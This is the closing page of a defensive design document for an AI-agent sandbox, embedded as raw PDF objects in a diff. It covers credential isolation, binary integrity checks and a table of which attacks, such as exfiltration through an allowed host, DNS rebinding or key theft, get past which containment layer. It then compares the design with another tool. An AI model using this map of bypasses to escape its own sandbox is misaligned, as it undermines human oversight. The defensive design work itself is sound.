+(  Proxy computes SHA256, compares with first-use hash) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  ? Hash mismatch ? DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(  What if agent uses its own API key to call an external service?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(Layer 7 ? Credential isolation) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(  Agent has only placeholder credentials) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(  ? Real key substitution only happens for approved hosts via proxy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(  ? Exfiltrated placeholder is useless) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 592 Tm
+(No single layer is sufficient alone:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 567 Tm
+(| Attack | Stopped By | Would Bypass \(alone\) |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 552 Tm
+(|--------|-----------|---------------------| | Connect to unauthorized host | L4 policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 537 Tm
+(| Network namespace only | | Exfiltrate via allowed host \(wrong endpoint\) | L7) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 522 Tm
+(inspection | L4 policy \(same host:port\) | | User-generated script calls allowed API |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 507 Tm
+(Per-binary policy | L7 inspection \(correct method/path\) | | Replace trusted binary |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 492 Tm
+(Binary integrity | Per-binary policy \(same path\) | | DNS rebinding to internal service |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 477 Tm
+(SSRF prevention | L4 policy \(passed\) + L7 inspection \(passed\) | | Steal API key and use) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 462 Tm
+(externally | Credential isolation | All network layers \(key is real, used from outside) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 447 Tm
+(sandbox\) |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 422 Tm
+(This is defense-in-depth: even if one layer fails or is bypassed, subsequent layers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 407 Tm
+(catch the attack. The combination of all six provides substantially stronger security) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 392 Tm
+(than any single mechanism.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 367 Tm
+(Comparison with Guardian Shell's Defense Layers) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 344 Tm
+(Guardian Shell layers:              OpenShell layers:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 332 Tm
+(1. eBPF tracepoints \(audit\)        1. Network namespace \(isolation\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 320 Tm
+(2. eBPF LSM hooks \(enforce\)        2. L4 OPA/Rego policy \(host:port\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 308 Tm
+(3. Landlock \(inode-level\)           3. SSRF prevention \(IP filtering\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 296 Tm
+(4. seccomp \(syscall filter\)         4. Per-binary policy \(process identity\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 284 Tm
+(5. cgroup \(identity + resources\)    5. L7 HTTP inspection \(method/path\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 272 Tm
+(6. Interactive permissions \(human\)  6. Binary integrity TOFU \(SHA256\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 260 Tm
+(7. Risk scoring \(intelligence\)      7. Credential isolation \(placeholders\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 248 Tm
+(8. Rate limiting \(anti-fatigue\)     8. Landlock \(filesystem\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 236 Tm
+(9. Audit trail \(forensics\)          9. seccomp \(syscall filter\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 216 Tm
+(Guardian Shell is stronger on filesystem security \(real-time monitoring, temporary) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 201 Tm
+(grants, human-in-the-loop approval\). OpenShell is stronger on network security \(L7) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 186 Tm
+(inspection, per-binary policy, credential isolation, SSRF prevention\). They have) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 171 Tm
+(complementary strengths ? an ideal security posture would combine both.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 140 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 122 Tm
+(*Last updated: 2026-03-25*) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 19 of 19) Tj
+ET
+endstream
+endobj
+23 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 4 0 R >>
+endobj
+24 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 5 0 R >>
+endobj
+25 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 6 0 R >>
+endobj
+26 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 7 0 R >>
+endobj
+27 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 8 0 R >>
+endobj
+28 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 9 0 R >>
+endobj
+29 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 10 0 R >>
+endobj
+30 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 11 0 R >>
+endobj
+31 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 12 0 R >>
+endobj
+32 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 13 0 R >>
+endobj
+33 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 14 0 R >>
+endobj
+34 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 15 0 R >>
+endobj
+35 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 16 0 R >>
+endobj
+36 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 17 0 R >>
+endobj
+37 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 18 0 R >>
+endobj
+38 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 19 0 R >>
+endobj
+39 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 20 0 R >>
+endobj
+40 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 21 0 R >>
+endobj
+41 0 obj
+<< /Type /Page /Parent 42 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 22 0 R >>
+endobj
+42 0 obj
+<< /Type /Pages /Count 19 /Kids [23 0 R 24 0 R 25 0 R 26 0 R 27 0 R 28 0 R 29 0 R 30 0 R 31 0 R 32 0 R 33 0 R 34 0 R 35 0 R 36 0 R 37 0 R 38 0 R 39 0 R 40 0 R 41 0 R] >>
+endobj
+43 0 obj
+<< /Type /Catalog /Pages 42 0 R >>
+endobj
+xref
+0 44
+0000000000 65535 f 
+0000000015 00000 n 
+0000000085 00000 n 
+0000000160 00000 n 
+0000000228 00000 n 
+0000003481 00000 n 
+0000007245 00000 n 
+0000011360 00000 n 
+0000014558 00000 n 
+0000017746 00000 n 
+0000021924 00000 n 
+0000025747 00000 n 
+0000029177 00000 n 
+0000032444 00000 n 
+0000035660 00000 n 
+0000038979 00000 n 
+0000042792 00000 n 
+0000046031 00000 n 
+0000049791 00000 n 
+0000053406 00000 n 
+0000057561 00000 n 
+0000061117 00000 n 
+0000065031 00000 n 
+0000069063 00000 n 
+0000069211 00000 n 
+0000069359 00000 n 
+0000069507 00000 n 
+0000069655 00000 n 
+0000069803 00000 n 
+0000069951 00000 n 
+0000070100 00000 n 
+0000070249 00000 n 
+0000070398 00000 n 
+0000070547 00000 n 
+0000070696 00000 n 
+0000070845 00000 n 
+0000070994 00000 n 
+0000071143 00000 n 
+0000071292 00000 n 
+0000071441 00000 n 
+0000071590 00000 n 
+0000071739 00000 n 
+0000071888 00000 n 
+0000072074 00000 n 
+trailer
+<< /Size 44 /Root 43 0 R >>
+startxref
+72125
+%%EOF
